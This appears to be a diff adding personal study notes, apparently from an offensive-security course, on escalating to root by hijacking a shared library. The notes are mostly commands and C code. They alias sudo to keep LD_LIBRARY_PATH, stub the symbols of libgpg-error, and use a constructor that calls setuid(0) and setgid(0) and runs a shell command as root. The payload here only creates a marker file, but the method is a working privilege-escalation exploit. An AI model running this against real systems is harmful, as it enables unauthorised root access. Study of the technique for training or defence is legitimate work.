@@ -1,0 +1,42 @@
+IN this we will exploit the way shared libraries are used. we can create our own shared library and create environemtn variables so that whenever user run particular program
+as root, our shared library will be called
+
+Compilation:
+
+gcc -Wall -fPIC -c -o hax.o hax.c
+
+gcc -shared -o libhax.so hax.o
+
+We'll run the ldd6 command in the target machine on the top program. This will give us information on which libraries are being loaded when top is being run.
+ldd /usr/bin/top
+
+export LD_LIBRARY_PATH=/home/offsec/ldlib/
+cp libhax.so libgpg-error.so.0
+
+readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
+
+Use : alias sudo="sudo LD_LIBRARY_PATH=/home/offsec/ldlib"
+
+If we source the .bashrc file to load the changes we made, when we run the command with sudo, the command executes as root.
+source ~/.bashrc
+sudo top
+ls -al /tmp/haxso.txt
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h> // for setuid/setgid
+
+static void runmahpayload() __attribute__((constructor));
+//We nee to come up with a list of symbols by following 10.3.2 for library
+
+int gpgrt_onclose;
+int _gpgrt_putc_overflow;
+int gpgrt_feof_unlocked;
+
+void runmahpayload() {
+	setuid(0);
+	setgid(0);
+    printf("DLL HIJACKING IN PROGRESS \n");
+    system("touch /tmp/haxso.txt");
+}
